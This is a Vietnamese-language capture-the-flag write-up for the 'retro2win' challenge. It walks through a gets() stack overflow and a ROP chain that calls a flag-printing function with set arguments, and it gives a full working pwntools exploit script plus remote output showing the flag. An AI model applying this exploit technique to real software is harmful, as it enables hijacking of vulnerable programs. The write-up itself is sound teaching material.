# Retro2Win

## Description

> So retro.. So winning..

## Analysis

Hãy nhìn qua binary này có những gì:

```bash
➜  challenge file retro2win
retro2win: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a7a81c7077ad6d86789f32538036d684003f7e7c, not stripped
➜  challenge checksec --file=retro2win
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols        No    0               3               retro2win
```

Chúng ta có thể thấy đây là một 64 bit binary và không có PIE với Canary

Hãy cùng nhìn sơ qua pseudo code của binary đó bằng IDA:

{% tabs %}
{% tab title="main" %}
```c
// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h] BYREF

  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        show_main_menu(*(_QWORD *)&argc, argv, envp);
        argv = (const char **)&v4;
        *(_QWORD *)&argc = "%d";
        __isoc99_scanf("%d", &v4);
        getchar();
        if ( v4 != 2 )
          break;
        battle_dragon();
      }
      if ( v4 > 2 )
        break;
      if ( v4 != 1 )
        goto LABEL_12;
      explore_forest();
    }
    if ( v4 == 3 )
      break;
    if ( v4 == 1337 )
    {
      enter_cheatcode();
    }
    else
    {
LABEL_12:
      *(_QWORD *)&argc = "Invalid choice! Please select a valid option.";
      puts("Invalid choice! Please select a valid option.");
    }
  }
  puts("Quitting game...");
  return 0;
}
```
{% endtab %}

{% tab title="enter_cheatcode" %}
```c
int enter_cheatcode()
{
  char v1[16]; // [rsp+0h] [rbp-10h] BYREF

  puts("Enter your cheatcode:");
  gets(v1);
  return printf("Checking cheatcode: %s!\n", v1);
}
```
{% endtab %}

{% tab title="cheat_mode" %}
```c
int __fastcall cheat_mode(__int64 a1, __int64 a2)
{
  char s[72]; // [rsp+10h] [rbp-50h] BYREF
  FILE *stream; // [rsp+58h] [rbp-8h]

  if ( a1 != 0x2323232323232323LL || a2 != 0x4242424242424242LL )
    return puts("Unauthorized access detected! Returning to main menu...\n");
  puts("CHEAT MODE ACTIVATED!");
  puts("You now have access to secret developer tools...\n");
  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("Error: Could not open flag.txt");
  if ( fgets(s, 64, stream) )
    printf("FLAG: %s\n", s);
  return fclose(stream);
}
```
{% endtab %}
{% endtabs %}

Trong hàm **main()** chúng ta thấy được nó sẽ hỏi và kêu chúng ta nhập chọn options. Và nếu option ta nhập là **1337** thì nó sẽ gọi hàm **enter\_cheatcode().**&#x20;

Trong hàm **enter\_cheatcode()** nó sử dụng một function **gets()**, function này khá nguy hiểm vì nó không kiểm tra giới hạn bộ nhớ của chuỗi tức là ta có thể nhập một chuỗi có độ dài vượt quá kích thước của v1 tức là nhập quá 16 bytes ở trong trường hợp này.

Vậy mục tiêu của chúng ta là làm nó overflow sang **cheat\_mode()** để đọc **flag**

### Offset

Sử dụng GDB để debug binary này

* Breakpoint tại **enter\_cheatcode()** và nhập 1 test input:

```bash
gef➤  search-pattern helloiloveyou
[+] Searching 'helloiloveyou' in memory
[+] In '[heap]'(0x603000-0x624000), permission=rw-
  0x6036b0 - 0x6036bf  →   "helloiloveyou\n"
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rw-
  0x7fffffffdaf0 - 0x7fffffffdafd  →   "helloiloveyou"
gef➤  i f
Stack level 0, frame at 0x7fffffffdb10:
 rip = 0x400811 in enter_cheatcode; saved rip = 0x400939
 called by frame at 0x7fffffffdb30
 Arglist at 0x7fffffffdb00, args:
 Locals at 0x7fffffffdb00, Previous frame's sp is 0x7fffffffdb10
 Saved registers:
  rbp at 0x7fffffffdb00, rip at 0x7fffffffdb08
```

Như chúng ta đã thấy khi ta nhập 1 chuỗi **`helloiloveyou`** vào thì input của chúng ta sẽ nằm ở **`0x7fffffffdaf0`** và điều chúng ta muốn đó chính là kiểm soát được **`RIP(0x7fffffffdb0)`** để có quyền điều khiển được luồng thực thi của chương trình

Vậy offset của chúng ta từ input đến **RIP** là **0x18 (24)** byte&#x20;

```python
>>> hex(0x7fffffffdb08- 0x7fffffffdaf0)
'0x18'
```

Nhưng có một điều sau khi ta đã kiểm soát được RIP rồi đó là điều kiện trong hàm **cheat\_mode()**&#x20;

```c
if ( a1 != 0x2323232323232323LL || a2 != 0x4242424242424242LL )
    return puts("Unauthorized access detected! Returning to main menu...\n");
```

Nên ta phải làm cách nào đó để gọi 2 params đó **`cheat_mode(0x2323232323232323, 0x4242424242424242)`**

Nói sơ một chút về **x86\_64 calling conventions**. Khi ta gọi một hàm thì **6 arguments** đầu của nó sẽ được lưu bởi các **registers** theo thứ tự **RDI, RSI, RDX, RCX, R8, R9;** và các **arguments** sau sẽ được đưa vào stack theo thứ từ từ phải sang trái (vì stack là cấu trúc LIFO). Vì vậy, chúng ta sẽ thiết lập **RDI = 0x2323232323232323** và **RSI = 0x424242424242424**2 trước khi vào **cheat\_mode()**

Để làm điều này, chúng ta sẽ sử dụng một chuỗi ROP

```bash
➜  challenge ROPgadget --binary retro2win > gadgets
➜  challenge cat gadgets | grep "pop rdi"
0x00000000004009b3 : pop rdi ; ret
➜  challenge cat gadgets | grep "pop rsi"
0x00000000004009b1 : pop rsi ; pop r15 ; ret
```

Với nhiêu đó thông tin, chúng ta sẽ bắt đầu viết exploit cho bài này

## Exploit

Vì sau pop rsi sẽ có thêm **pop r5**, nó vẫn sẽ ổn nếu dùng gadget này và **r5** không thành vấn đề đối với chung ta. Nhưng chúng ta vẫn cần phải điền vào ngăn xếp để nó không đưa **cheat\_mode()** vào **r15** ta chỉ cần thay thế nó với **dummy\_value**

```python
#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug' 
context.terminal = ['tmux', 'splitw', '-v', '-p', '90']
exe = context.binary = ELF('./retro2win', checksec=False)


# Shorthanding functions for input/output
info = lambda msg: log.info(msg)
s = lambda data: p.send(data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
r = lambda: p.recv
rl = lambda: p.recvline()
rall = lambda: p.recvall()

# GDB scripts for debugging
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

    b *0x400829
    c
''')

p = remote('retro2win.ctf.intigriti.io',1338) if args.REMOTE else process(argv=[exe.path], aslr=False)
if args.GDB: 
    GDB()
    input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================



pop_rdi = 0x4009b3
pop_rsi_r5 = 0x4009b1
cheat_mode = 0x400736
dummy_value = 0x4242424242424242

pay = b'A' * 16   # fill in buffer
pay += b'B' * 8   # overwrite saved rbp
pay += p64(pop_rdi) + p64(0x2323232323232323)
pay += p64(pop_rsi_r5) + p64(0x4242424242424242) + p64(dummy_value)
pay += p64(cheat_mode)

sla(b'option:', b'1337')
sla(b'cheatcode:', pay)

p.interactive()
```

Khi ta exit khỏi **enter\_cheatcode()** nó sẽ **return** về **pop\_rdi** đến **rop\_rsi\_r5** và rồi **cheat\_code()** và stack sẽ trông như thế này:

```bash
+---------------+       +---------------+ 
|  ........     | ----> |  AAAAAAAA     |    
|---------------|       |---------------|
|  saved rbp    |       |  BBBBBBBB     |
|---------------|       |---------------|
|  saved rip    |       |  pop_rdi      |
|---------------|       |---------------|
|               |       |  0x2323.....  |
|---------------|       |---------------|
|               |       |  pop_rsi      |
|---------------|       |---------------|
|               |       |  0x4242.....  |
|---------------|       |---------------|
|               |       |  dummy_value  |    <--- pop r5
|---------------|       |---------------|
|               |       |  cheat_mode   |
|               |       |               |
+---------------+       +---------------+
```

```bash
➜  challenge python3 exploit.py REMOTE
[+] Opening connection to retro2win.ctf.intigriti.io on port 1338: Done
[*] Switching to interactive mode

Checking cheatcode: AAAAAAAAAAAAAAAABBBBBBBB\xb3        @!
CHEAT MODE ACTIVATED!
You now have access to secret developer tools...

FLAG: INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}
[*] Got EOF while reading in interactive
```
